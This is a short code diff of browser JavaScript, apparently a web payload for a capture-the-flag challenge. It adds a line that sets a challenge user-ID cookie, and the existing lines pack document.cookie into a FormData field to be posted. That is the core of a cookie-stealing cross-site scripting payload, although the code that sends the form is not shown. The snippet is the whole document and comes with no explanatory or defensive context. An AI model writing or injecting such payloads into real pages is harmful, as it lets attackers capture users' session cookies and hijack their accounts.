@@ -1,3 +1,5 @@
+document.cookie = "CHALBROKER_USER_ID=bh1642";
+
 var formData = new FormData();
 formData.append('title', 'test');
 formData.append('content', document.cookie);
